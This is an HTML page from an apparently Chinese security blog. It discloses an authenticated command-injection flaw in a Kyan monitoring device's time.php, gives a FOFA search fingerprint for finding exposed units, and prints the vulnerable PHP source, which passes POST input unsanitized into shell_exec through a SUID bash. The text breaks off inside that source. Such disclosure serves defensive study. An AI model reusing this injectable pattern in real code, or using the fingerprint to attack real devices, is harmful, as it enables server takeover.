@@ -1,0 +1,703 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>Kyan 网络监控设备 time.php 远程命令执行漏洞 - Chinchin&#39;s blog</title><meta name="Description" content="这是我的全新 Hugo 网站"><meta property="og:title" content="Kyan 网络监控设备 time.php 远程命令执行漏洞" />
+<meta property="og:description" content="Kyan 网络监控设备 time.php 远程命令执行漏洞 漏洞描述 Kyan 网络监控设备 time.php 可在身份验证的情况下执行任意命令, 配合账号密码泄露漏洞，可以获取服务器权限，存在远程" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://example.org/kyan-%E7%BD%91%E7%BB%9C%E7%9B%91%E6%8E%A7%E8%AE%BE%E5%A4%87-time.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" /><meta property="og:image" content="http://example.org/logo.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-12-08T01:08:29+08:00" />
+<meta property="article:modified_time" content="2023-12-08T01:08:29+08:00" /><meta property="og:site_name" content="Chinchin&#39;s blog" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="http://example.org/logo.png"/>
+
+<meta name="twitter:title" content="Kyan 网络监控设备 time.php 远程命令执行漏洞"/>
+<meta name="twitter:description" content="Kyan 网络监控设备 time.php 远程命令执行漏洞 漏洞描述 Kyan 网络监控设备 time.php 可在身份验证的情况下执行任意命令, 配合账号密码泄露漏洞，可以获取服务器权限，存在远程"/>
+<meta name="twitter:site" content="@xxxx"/>
+<meta name="application-name" content="Chinchin&#39;s blog">
+<meta name="apple-mobile-web-app-title" content="Chinchin&#39;s blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://example.org/kyan-%E7%BD%91%E7%BB%9C%E7%9B%91%E6%8E%A7%E8%AE%BE%E5%A4%87-time.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" /><link rel="prev" href="http://example.org/lanproxy-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E-cve-2021-3019/" /><link rel="next" href="http://example.org/kyan-%E7%BD%91%E7%BB%9C%E7%9B%91%E6%8E%A7%E8%AE%BE%E5%A4%87-run.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Kyan 网络监控设备 time.php 远程命令执行漏洞",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/example.org\/kyan-%E7%BD%91%E7%BB%9C%E7%9B%91%E6%8E%A7%E8%AE%BE%E5%A4%87-time.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E\/"
+        },"genre": "posts","keywords": "漏洞知识库","wordcount":  1016 ,
+        "url": "http:\/\/example.org\/kyan-%E7%BD%91%E7%BB%9C%E7%9B%91%E6%8E%A7%E8%AE%BE%E5%A4%87-time.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E\/","datePublished": "2023-12-08T01:08:29+08:00","dateModified": "2023-12-08T01:08:29+08:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "Chinchin"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Chinchin&#39;s blog"><span id="id-1" class="typeit"></span></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> 文章 </a><a class="menu-item" href="/tags/"> 标签 </a><a class="menu-item" href="/categories/"> 分类 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Chinchin&#39;s blog"><span id="id-2" class="typeit"></span></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">文章</a><a class="menu-item" href="/tags/" title="">标签</a><a class="menu-item" href="/categories/" title="">分类</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Kyan 网络监控设备 time.php 远程命令执行漏洞</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Chinchin</a>
+</span>&nbsp;<span class="post-category">included in <a href="/categories/%E6%BC%8F%E6%B4%9E%E7%9F%A5%E8%AF%86%E5%BA%93/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>漏洞知识库</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2023-12-08">2023-12-08</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;1016 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;3 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="true">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#漏洞描述">漏洞描述</a></li>
+    <li><a href="#漏洞影响">漏洞影响</a></li>
+    <li><a href="#网络测绘">网络测绘</a></li>
+    <li><a href="#漏洞复现">漏洞复现</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h1 id="kyan-网络监控设备-timephp-远程命令执行漏洞">Kyan 网络监控设备 time.php 远程命令执行漏洞</h1>
+<h2 id="漏洞描述">漏洞描述</h2>
+<p>Kyan 网络监控设备 time.php 可在身份验证的情况下执行任意命令, 配合账号密码泄露漏洞，可以获取服务器权限，存在远程命令执行漏洞</p>
+<h2 id="漏洞影响">漏洞影响</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Kyan
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="网络测绘">网络测绘</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">app=&#34;Kyan设计&#34;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="漏洞复现">漏洞复现</h2>
+<p>登录页面如下</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/202205191753857.png"
+        data-srcset="/images/202205191753857.png, /images/202205191753857.png 1.5x, /images/202205191753857.png 2x"
+        data-sizes="auto"
+        alt="/images/202205191753857.png"
+        title="image-20220519175106605" /></p>
+<p>存在漏洞的文件: <code>/time.php</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">  1
+</span><span class="lnt">  2
+</span><span class="lnt">  3
+</span><span class="lnt">  4
+</span><span class="lnt">  5
+</span><span class="lnt">  6
+</span><span class="lnt">  7
+</span><span class="lnt">  8
+</span><span class="lnt">  9
+</span><span class="lnt"> 10
+</span><span class="lnt"> 11
+</span><span class="lnt"> 12
+</span><span class="lnt"> 13
+</span><span class="lnt"> 14
+</span><span class="lnt"> 15
+</span><span class="lnt"> 16
+</span><span class="lnt"> 17
+</span><span class="lnt"> 18
+</span><span class="lnt"> 19
+</span><span class="lnt"> 20
+</span><span class="lnt"> 21
+</span><span class="lnt"> 22
+</span><span class="lnt"> 23
+</span><span class="lnt"> 24
+</span><span class="lnt"> 25
+</span><span class="lnt"> 26
+</span><span class="lnt"> 27
+</span><span class="lnt"> 28
+</span><span class="lnt"> 29
+</span><span class="lnt"> 30
+</span><span class="lnt"> 31
+</span><span class="lnt"> 32
+</span><span class="lnt"> 33
+</span><span class="lnt"> 34
+</span><span class="lnt"> 35
+</span><span class="lnt"> 36
+</span><span class="lnt"> 37
+</span><span class="lnt"> 38
+</span><span class="lnt"> 39
+</span><span class="lnt"> 40
+</span><span class="lnt"> 41
+</span><span class="lnt"> 42
+</span><span class="lnt"> 43
+</span><span class="lnt"> 44
+</span><span class="lnt"> 45
+</span><span class="lnt"> 46
+</span><span class="lnt"> 47
+</span><span class="lnt"> 48
+</span><span class="lnt"> 49
+</span><span class="lnt"> 50
+</span><span class="lnt"> 51
+</span><span class="lnt"> 52
+</span><span class="lnt"> 53
+</span><span class="lnt"> 54
+</span><span class="lnt"> 55
+</span><span class="lnt"> 56
+</span><span class="lnt"> 57
+</span><span class="lnt"> 58
+</span><span class="lnt"> 59
+</span><span class="lnt"> 60
+</span><span class="lnt"> 61
+</span><span class="lnt"> 62
+</span><span class="lnt"> 63
+</span><span class="lnt"> 64
+</span><span class="lnt"> 65
+</span><span class="lnt"> 66
+</span><span class="lnt"> 67
+</span><span class="lnt"> 68
+</span><span class="lnt"> 69
+</span><span class="lnt"> 70
+</span><span class="lnt"> 71
+</span><span class="lnt"> 72
+</span><span class="lnt"> 73
+</span><span class="lnt"> 74
+</span><span class="lnt"> 75
+</span><span class="lnt"> 76
+</span><span class="lnt"> 77
+</span><span class="lnt"> 78
+</span><span class="lnt"> 79
+</span><span class="lnt"> 80
+</span><span class="lnt"> 81
+</span><span class="lnt"> 82
+</span><span class="lnt"> 83
+</span><span class="lnt"> 84
+</span><span class="lnt"> 85
+</span><span class="lnt"> 86
+</span><span class="lnt"> 87
+</span><span class="lnt"> 88
+</span><span class="lnt"> 89
+</span><span class="lnt"> 90
+</span><span class="lnt"> 91
+</span><span class="lnt"> 92
+</span><span class="lnt"> 93
+</span><span class="lnt"> 94
+</span><span class="lnt"> 95
+</span><span class="lnt"> 96
+</span><span class="lnt"> 97
+</span><span class="lnt"> 98
+</span><span class="lnt"> 99
+</span><span class="lnt">100
+</span><span class="lnt">101
+</span><span class="lnt">102
+</span><span class="lnt">103
+</span><span class="lnt">104
+</span><span class="lnt">105
+</span><span class="lnt">106
+</span><span class="lnt">107
+</span><span class="lnt">108
+</span><span class="lnt">109
+</span><span class="lnt">110
+</span><span class="lnt">111
+</span><span class="lnt">112
+</span><span class="lnt">113
+</span><span class="lnt">114
+</span><span class="lnt">115
+</span><span class="lnt">116
+</span><span class="lnt">117
+</span><span class="lnt">118
+</span><span class="lnt">119
+</span><span class="lnt">120
+</span><span class="lnt">121
+</span><span class="lnt">122
+</span><span class="lnt">123
+</span><span class="lnt">124
+</span><span class="lnt">125
+</span><span class="lnt">126
+</span><span class="lnt">127
+</span><span class="lnt">128
+</span><span class="lnt">129
+</span><span class="lnt">130
+</span><span class="lnt">131
+</span><span class="lnt">132
+</span><span class="lnt">133
+</span><span class="lnt">134
+</span><span class="lnt">135
+</span><span class="lnt">136
+</span><span class="lnt">137
+</span><span class="lnt">138
+</span><span class="lnt">139
+</span><span class="lnt">140
+</span><span class="lnt">141
+</span><span class="lnt">142
+</span><span class="lnt">143
+</span><span class="lnt">144
+</span><span class="lnt">145
+</span><span class="lnt">146
+</span><span class="lnt">147
+</span><span class="lnt">148
+</span><span class="lnt">149
+</span><span class="lnt">150
+</span><span class="lnt">151
+</span><span class="lnt">152
+</span><span class="lnt">153
+</span><span class="lnt">154
+</span><span class="lnt">155
+</span><span class="lnt">156
+</span><span class="lnt">157
+</span><span class="lnt">158
+</span><span class="lnt">159
+</span><span class="lnt">160
+</span><span class="lnt">161
+</span><span class="lnt">162
+</span><span class="lnt">163
+</span><span class="lnt">164
+</span><span class="lnt">165
+</span><span class="lnt">166
+</span><span class="lnt">167
+</span><span class="lnt">168
+</span><span class="lnt">169
+</span><span class="lnt">170
+</span><span class="lnt">171
+</span><span class="lnt">172
+</span><span class="lnt">173
+</span><span class="lnt">174
+</span><span class="lnt">175
+</span><span class="lnt">176
+</span><span class="lnt">177
+</span><span class="lnt">178
+</span><span class="lnt">179
+</span><span class="lnt">180
+</span><span class="lnt">181
+</span><span class="lnt">182
+</span><span class="lnt">183
+</span><span class="lnt">184
+</span><span class="lnt">185
+</span><span class="lnt">186
+</span><span class="lnt">187
+</span><span class="lnt">188
+</span><span class="lnt">189
+</span><span class="lnt">190
+</span><span class="lnt">191
+</span><span class="lnt">192
+</span><span class="lnt">193
+</span><span class="lnt">194
+</span><span class="lnt">195
+</span><span class="lnt">196
+</span><span class="lnt">197
+</span><span class="lnt">198
+</span><span class="lnt">199
+</span><span class="lnt">200
+</span><span class="lnt">201
+</span><span class="lnt">202
+</span><span class="lnt">203
+</span><span class="lnt">204
+</span><span class="lnt">205
+</span><span class="lnt">206
+</span><span class="lnt">207
+</span><span class="lnt">208
+</span><span class="lnt">209
+</span><span class="lnt">210
+</span><span class="lnt">211
+</span><span class="lnt">212
+</span><span class="lnt">213
+</span><span class="lnt">214
+</span><span class="lnt">215
+</span><span class="lnt">216
+</span><span class="lnt">217
+</span><span class="lnt">218
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-zed" data-lang="zed"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="n">php</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">require_once</span><span class="w"> </span><span class="err">&#39;</span><span class="n">functions</span><span class="p">.</span><span class="n">php</span><span class="err">&#39;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">require_once</span><span class="w"> </span><span class="err">&#39;</span><span class="n">international</span><span class="p">.</span><span class="n">php</span><span class="err">&#39;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">session_start</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">auth_check</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//showHeader(&#39;Route&#39;, array(&#39;table.css&#39;));
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">if</span><span class="p">(</span><span class="err">$</span><span class="n">_SERVER</span><span class="p">[</span><span class="err">&#39;</span><span class="n">REQUEST_METHOD</span><span class="err">&#39;</span><span class="p">]</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="err">&#39;</span><span class="n">POST</span><span class="err">&#39;</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="n">if</span><span class="p">(</span><span class="o">!</span><span class="n">user_is_admin</span><span class="p">())</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="n">showErrMessage</span><span class="p">(</span><span class="err">&#34;</span><span class="kd">permission</span><span class="w"> </span><span class="n">denied</span><span class="err">&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="n">exit</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="err">$</span><span class="n">timesynctype</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">$</span><span class="n">_POST</span><span class="p">[</span><span class="err">&#34;</span><span class="n">timesynctype</span><span class="err">&#34;</span><span class="p">];</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="n">if</span><span class="p">(</span><span class="err">$</span><span class="n">timesynctype</span><span class="o">!=</span><span class="err">&#34;</span><span class="n">client</span><span class="err">&#34;</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="err">$</span><span class="n">output</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">shell_exec</span><span class="p">(</span><span class="err">&#34;</span><span class="o">/</span><span class="nn">bin/</span><span class="n">bashsuid</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w"> </span><span class="o">-</span><span class="n">c</span><span class="w"> </span><span class="err">\&#34;</span><span class="o">/</span><span class="nn">usr/sbin/</span><span class="n">ntpdate</span><span class="w"> </span><span class="err">&#34;</span><span class="w"> </span><span class="p">.</span><span class="err">$</span><span class="n">timesynctype</span><span class="p">.</span><span class="w"> </span><span class="err">&#34;\&#34;&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="n">showMessage</span><span class="p">(</span><span class="err">$</span><span class="n">output</span><span class="p">);</span><span class="w">		
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="n">shell_exec</span><span class="p">(</span><span class="err">&#34;</span><span class="o">/</span><span class="nn">bin/</span><span class="n">bashsuid</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w"> </span><span class="o">-</span><span class="n">c</span><span class="w"> </span><span class="err">\&#34;</span><span class="n">hwclock</span><span class="w"> </span><span class="o">--</span><span class="n">systohc</span><span class="err">\&#34;&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="p">}</span><span class="n">else</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="err">$</span><span class="n">ctime</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">$</span><span class="n">_POST</span><span class="p">[</span><span class="err">&#34;</span><span class="n">ctime</span><span class="err">&#34;</span><span class="p">];</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="n">shell_exec</span><span class="p">(</span><span class="err">&#34;</span><span class="o">/</span><span class="nn">bin/</span><span class="n">bashsuid</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w"> </span><span class="o">-</span><span class="n">c</span><span class="w"> </span><span class="err">\&#34;</span><span class="n">date</span><span class="w"> </span><span class="err">&#34;</span><span class="w"> </span><span class="p">.</span><span class="err">$</span><span class="n">ctime</span><span class="p">.</span><span class="w"> </span><span class="err">&#34;\&#34;&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="n">shell_exec</span><span class="p">(</span><span class="err">&#34;</span><span class="o">/</span><span class="nn">bin/</span><span class="n">bashsuid</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w"> </span><span class="o">-</span><span class="n">c</span><span class="w"> </span><span class="err">\&#34;</span><span class="n">hwclock</span><span class="w"> </span><span class="o">--</span><span class="n">systohc</span><span class="err">\&#34;&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">echo</span><span class="w"> </span><span class="err">&#34;</span><span class="o">&lt;</span><span class="n">html</span><span class="w"> </span><span class="n">xmlns</span><span class="o">=</span><span class="err">\&#34;</span><span class="n">http</span><span class="o">:</span><span class="c1">//www.w3.org/1999/xhtml\&#34;&gt;\n&#34;;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">        </span><span class="n">echo</span><span class="w"> </span><span class="err">&#34;</span><span class="w">  </span><span class="o">&lt;</span><span class="n">head</span><span class="o">&gt;</span><span class="err">\</span><span class="n">n</span><span class="err">&#34;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">echo</span><span class="w"> </span><span class="err">&#34;</span><span class="w">    </span><span class="o">&lt;</span><span class="n">meta</span><span class="w"> </span><span class="n">http</span><span class="o">-</span><span class="n">equiv</span><span class="o">=</span><span class="err">\&#34;</span><span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="err">\&#34;</span><span class="w"> </span><span class="n">content</span><span class="o">=</span><span class="err">\&#34;</span><span class="nn">text/</span><span class="n">html</span><span class="p">;</span><span class="w"> </span><span class="n">charset</span><span class="o">=</span><span class="n">UTF</span><span class="o">-</span><span class="err">8\&#34;</span><span class="w"> </span><span class="o">/&gt;</span><span class="err">\</span><span class="n">n</span><span class="err">&#34;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">echo</span><span class="w"> </span><span class="err">&#34;</span><span class="w">    </span><span class="o">&lt;</span><span class="n">meta</span><span class="w"> </span><span class="n">http</span><span class="o">-</span><span class="n">equiv</span><span class="o">=</span><span class="err">\&#34;</span><span class="n">Content</span><span class="o">-</span><span class="n">Style</span><span class="o">-</span><span class="n">Type</span><span class="err">\&#34;</span><span class="w"> </span><span class="n">content</span><span class="o">=</span><span class="err">\&#34;</span><span class="nn">text/</span><span class="n">css</span><span class="err">\&#34;</span><span class="w"> </span><span class="o">/&gt;</span><span class="err">\</span><span class="n">n</span><span class="err">&#34;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">echo</span><span class="w"> </span><span class="err">&#34;</span><span class="w">    </span><span class="o">&lt;</span><span class="n">meta</span><span class="w"> </span><span class="n">http</span><span class="o">-</span><span class="n">equiv</span><span class="o">=</span><span class="err">\&#34;</span><span class="n">Content</span><span class="o">-</span><span class="n">Script</span><span class="o">-</span><span class="n">Type</span><span class="err">\&#34;</span><span class="w"> </span><span class="n">content</span><span class="o">=</span><span class="err">\&#34;</span><span class="nn">text/</span><span class="n">javascript</span><span class="err">\&#34;</span><span class="w"> </span><span class="o">/&gt;</span><span class="err">\</span><span class="n">n</span><span class="err">&#34;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">echo</span><span class="w"> </span><span class="err">&#34;</span><span class="w">    </span><span class="o">&lt;</span><span class="n">link</span><span class="w"> </span><span class="n">type</span><span class="o">=</span><span class="err">\&#34;</span><span class="nn">text/</span><span class="n">css</span><span class="err">\&#34;</span><span class="w"> </span><span class="n">rel</span><span class="o">=</span><span class="err">\&#34;</span><span class="n">stylesheet</span><span class="err">\&#34;</span><span class="w"> </span><span class="n">href</span><span class="o">=</span><span class="err">\&#34;</span><span class="p">.</span><span class="o">/</span><span class="nn">templates/</span><span class="n">clean</span><span class="p">.</span><span class="n">css</span><span class="err">\&#34;</span><span class="w"> </span><span class="n">title</span><span class="o">=</span><span class="err">\&#34;</span><span class="n">PSI_Template</span><span class="err">\&#34;</span><span class="o">/&gt;</span><span class="err">\</span><span class="n">n</span><span class="err">&#34;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">echo</span><span class="w"> </span><span class="err">&#34;</span><span class="w">    </span><span class="o">&lt;</span><span class="n">title</span><span class="o">&gt;</span><span class="n">time</span><span class="o">&lt;/</span><span class="n">title</span><span class="o">&gt;</span><span class="err">\</span><span class="n">n</span><span class="err">&#34;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="n">echo</span><span class="w"> </span><span class="err">&#34;</span><span class="o">&lt;</span><span class="n">style</span><span class="w"> </span><span class="n">type</span><span class="o">=</span><span class="err">\&#34;</span><span class="nn">text/</span><span class="n">css</span><span class="err">\&#34;</span><span class="o">&gt;</span><span class="err">&#34;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="n">echo</span><span class="w"> </span><span class="err">&#34;</span><span class="n">th</span><span class="p">,</span><span class="w"> </span><span class="n">td</span><span class="p">,</span><span class="w"> </span><span class="n">h3</span><span class="w"> </span><span class="p">{</span><span class="err">&#34;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="n">echo</span><span class="w"> </span><span class="err">&#34;</span><span class="n">font</span><span class="o">-</span><span class="n">size</span><span class="o">:</span><span class="w"> </span><span class="err">12</span><span class="n">px</span><span class="p">;</span><span class="err">&#34;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="n">echo</span><span class="w"> </span><span class="err">&#34;</span><span class="p">}</span><span class="err">&#34;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="n">echo</span><span class="w"> </span><span class="err">&#34;</span><span class="o">&lt;/</span><span class="n">style</span><span class="o">&gt;</span><span class="err">&#34;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">echo</span><span class="w"> </span><span class="err">&#34;</span><span class="w">  </span><span class="o">&lt;/</span><span class="n">head</span><span class="o">&gt;</span><span class="err">\</span><span class="n">n</span><span class="err">&#34;</span><span class="p">;</span><span class="w">	
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//print_html_begin(&#34;time&#34;);
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">?&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">&lt;</span><span class="n">script</span><span class="w"> </span><span class="n">language</span><span class="o">=</span><span class="err">&#34;</span><span class="n">javascript</span><span class="err">&#34;</span><span class="w"> </span><span class="n">type</span><span class="o">=</span><span class="err">&#34;</span><span class="nn">text/</span><span class="n">javascript</span><span class="err">&#34;</span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//因程序执行耗费时间,所以时间并不十分准确,误差大约在2000毫秒以下
